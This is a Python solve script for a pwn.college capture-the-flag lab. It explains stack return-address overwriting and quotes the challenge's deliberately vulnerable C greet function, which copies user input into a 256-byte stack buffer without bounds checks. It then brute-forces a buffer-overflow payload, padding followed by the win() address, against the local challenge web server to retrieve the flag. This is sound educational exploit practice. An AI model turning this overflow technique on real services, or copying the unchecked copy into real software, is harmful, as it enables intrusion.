import os
import re
import requests
import time


"""
Theory:
	In return oriented programming systems function calls save the address directly following the instruction of the function call
	onto the stack, before jumping to the function code. This way after executing the function, we can pop the saved address off the
	stack and return to executing the program code after the function call.

	Space for local function variables is usually assigned on the stack as well unless heap memory is requested explicitly.

	In the challenge the name buffer is created on the stack. After the name buffer the return address of the greet function is also
	saved on the stack. If we were to copy bytes to the buffer, starting at the buffer base address we would eventually fill up the space
	that was allocated for the buffer on the stack. Copying more bytes to the buffer still, would allow us to eventually copy bytes into
	the stack space where the greet return address is stored, thus overwriting it. We could return to a different part of the program.

    if "libgreet" not in globals():
        global libgreet
        shared_library_file = tempfile.NamedTemporaryFile("x", suffix=".so")
        gcc_args = ["/usr/bin/gcc", "-x", "c", "-shared", "-fPIC", "-fno-stack-protector", "-o", shared_library_file.name, "-"]
        subprocess.run(gcc_args, input=r'''
        #include <unistd.h>
        #include <fcntl.h>
        #include <stdio.h>
        #include <string.h>

        void __attribute__ ((constructor)) disable_buffering(void) {
          setvbuf(stdout, NULL, _IONBF, 0);
        }

        void win(void)
        {
          char flag[256] = { 0 };
          int flag_fd;

          puts("You win! Here is your flag:");

          flag_fd = open("/flag", 0);
          read(flag_fd, flag, sizeof(flag));
          puts(flag);
        }

        void * win_address(void)
        {
          return win;
        }

        void greet(char *name, size_t length)
        {
          char buffer[256] = { 0 };

          memcpy(buffer, "Hello, ", 7);
          memcpy(buffer + 7, name, length);
          memcpy(buffer + 7 + length, "!", 1);

          puts(buffer);
        }
        '''.encode())
        libgreet = ctypes.CDLL(shared_library_file.name)
        libgreet.win_address.restype = ctypes.c_void_p

    if request.path == "/win_address":
        return f"{hex(libgreet.win_address())}\n"

    if request.path == "/greet":
        name = request.args.get("name")
        assert name, "Missing `name` argument"

        def stream_greet():
            r, w = os.pipe()
            pid = os.fork()

            if pid == 0:
                os.close(r)
                os.dup2(w, 1)
                name_buffer = ctypes.create_string_buffer(name.encode("latin"))
                libgreet.greet(name_buffer, len(name))
                os._exit(0)

            os.close(w)
            while True:
                data = os.read(r, 256)
                if not data:
                    break
                yield data
            os.wait()

        return stream_greet()

    return "Not Found\n", 404
"""


pat0 = re.compile(r".*Now running the web server:\n")
r_pipe1, w_pipe1 = os.pipe()

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)

	os.dup2(w_pipe1, 1)
	os.close(w_pipe1)

	os.execv("/challenge/run", ["/challenge/run"])
	print("Error execv.")
	exit(1)

os.close(w_pipe1)

output = os.fdopen(r_pipe1, "r")

while True:
	line = output.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/win_address"
		r = requests.get(url)
		win_addr = r.text.strip()
		print(f"hex addr {win_addr[2:]}, int addr {int(win_addr, 16)}, byte address little {int(win_addr, 16).to_bytes(8, 'little')}, latin decoded addr {int(win_addr, 16).to_bytes(8, 'little').decode('latin')}")
		win_addr = int(win_addr, 16).to_bytes(8, "little").decode("latin")
		url = "http://challenge.localhost:80/greet"
		i = 0
		while i < 280: # 280 - 256 = 24 which should be more than enough bytes to cover base pointer space for previous stack frame as well as greet return address on stack
			data = {"name": "A" * i + win_addr}
			r = requests.get(url, params=data)
			print(r.text)
			if "pwn.college" in r.text:
				break
			i += 1
			time.sleep(0.02)
		break
